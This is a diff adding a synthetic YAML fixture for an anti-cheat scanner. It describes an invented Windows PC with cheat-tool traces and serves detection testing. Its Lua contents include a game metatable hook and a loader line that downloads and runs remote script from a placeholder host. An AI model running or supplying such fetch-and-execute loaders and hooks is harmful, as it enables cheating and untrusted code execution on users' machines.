@@ -1,0 +1,46 @@
+# SPDX-FileCopyrightText: 2026 B.O.P.E Scanner contributors
+# SPDX-License-Identifier: GPL-3.0-or-later
+# Synthetic fixture host — see ../PROVENANCE.md.
+#
+# A PC with traces from several independent sources (B.O.P.E, ADR 0100): an executor-style folder in
+# Downloads with an unsigned program and an autoexec script that calls executor-only functions, a loose
+# loader script on the Desktop, an Arduino board that enumerated as a keyboard half an hour after the
+# folder was created, and Cheat Engine running. Every name, hash and time is invented; no real cheat file
+# is described or included.
+platform: windows
+os_build: "26100"
+elevated: true
+env:
+  USERPROFILE: 'C:\Users\fixtureuser'
+  LOCALAPPDATA: 'C:\Users\fixtureuser\AppData\Local'
+  APPDATA: 'C:\Users\fixtureuser\AppData\Roaming'
+  SystemRoot: 'C:\Windows'
+  ProgramFiles: 'C:\Program Files'
+processes:
+  - { pid: 900, name: explorer.exe, path: 'C:\Windows\explorer.exe', started_at: '2026-10-15T08:00:00Z' }
+  - { pid: 3100, name: cheatengine-x86_64.exe, path: 'C:\Program Files\Cheat Engine 7.5\cheatengine-x86_64.exe', started_at: '2026-10-15T11:50:00Z', parent_pid: 900 }
+devices:
+  - { id: 'HID\VID_2341&PID_8036&MI_02\7&1&0&0000', present: false, first_install: '2026-10-14T21:30:00Z', last_arrival: '2026-10-14T21:30:00Z', last_removal: '2026-10-14T23:00:00Z' }
+filesystem:
+  'C:\Users\fixtureuser':
+    - { name: Downloads, directory: true }
+    - { name: Desktop, directory: true }
+  'C:\Users\fixtureuser\Downloads':
+    - { name: ToolPack, directory: true, created: '2026-10-14T21:00:00Z', modified: '2026-10-14T21:05:00Z' }
+  'C:\Users\fixtureuser\Downloads\ToolPack':
+    - { name: autoexec, directory: true }
+    - { name: workspace, directory: true }
+    - { name: bin, directory: true }
+    - name: ToolPack.exe
+      sha256: 'dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd'
+      signature: { state: no_embedded_signature }
+      created: '2026-10-14T21:00:00Z'
+      modified: '2026-10-14T21:00:00Z'
+  'C:\Users\fixtureuser\Downloads\ToolPack\autoexec':
+    - name: init.lua
+      modified: '2026-10-14T21:10:00Z'
+      content: "local env = getgenv()\nlocal mt = getrawmetatable(game)\nsetreadonly(mt, false)\nhookmetamethod(game, '__namecall', newcclosure(function(...) end))\n"
+  'C:\Users\fixtureuser\Desktop':
+    - name: loader.lua
+      modified: '2026-10-14T21:20:00Z'
+      content: "loadstring(game:HttpGet('https://example.invalid/hub.lua'))()\n"
